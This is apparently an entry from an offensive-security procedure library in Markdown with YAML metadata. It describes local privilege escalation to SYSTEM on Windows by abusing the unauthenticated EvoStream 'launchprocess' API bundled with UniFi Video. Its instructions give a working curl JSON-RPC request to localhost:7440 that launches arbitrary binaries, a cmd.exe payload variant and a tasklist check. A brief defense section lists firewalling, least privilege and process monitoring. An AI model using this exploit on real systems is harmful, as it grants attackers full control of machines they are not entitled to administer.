---
id: proc-launchprocess-local
tags:
  - privilege-escalation
  - command-injection
  - evostream
type: procedure
tools:
  - '[[tools/poc.py]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-launchprocess]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:58.565Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Local-Privilege-Escalation-via-LaunchProcess-Command

## Summary

This procedure exploits the unauthenticated launchprocess API in EvoStream to execute arbitrary binaries as the SYSTEM user, achieving local privilege escalation in UniFi Video on Windows.

## Description

The launchprocess endpoint allows specifying any binary path and arguments, executed with SYSTEM privileges since evostream runs as such. This is ideal for local escalation from a standard user, potentially spawning shells or payloads.

## Requirements

1. Local user access on Windows target
2. EvoStream API accessible on localhost:7440
3. Python environment for POC script or curl for direct calls

## Defense

Defensive measures and detection strategies:

- Disable or firewall localhost:7440 if not needed
- Run UniFi Video services with least privileges
- Monitor for unexpected process spawns from evostream.exe

## Objectives

1. Escalate privileges to SYSTEM
2. Execute arbitrary commands locally
3. Gain full system access

## Instructions

### Step 1: Prepare Payload

**Context**: Define the binary and arguments, e.g., calc.exe for testing or cmd.exe /c for commands.

No command here; use in next step.

### Step 2: Execute LaunchProcess via API

**Context**: Send JSON-RPC request to launch the process as SYSTEM.

**Command** ([[commands/curl-launchprocess]]):
```bash
curl -X POST http://localhost:7440/jsonrpc -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "launchprocess", "params": {"appName": "calc.exe", "streamName": ""}, "id": 1}'
```

> This launches calc.exe as SYSTEM. For custom commands, adjust params to {"appName": "cmd.exe", "streamName": "/c whoami > C:\temp\output.txt"}. Expected output: JSON response with success, and process visible in Task Manager under SYSTEM.

### Step 3: Verify Escalation

**Context**: Check if the executed process ran with elevated privileges.

**Command** ([[commands/tasklist-filter]]):
```bash
tasklist /fi "imagename eq calc.exe" /fo table
```

> Confirms calc.exe running; use whoami in payload for privilege check.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/curl-launchprocess]]
- [[commands/tasklist-filter]]

## Tools Used

- [[tools/poc.py]]

## Tags

- privilege-escalation
- rce
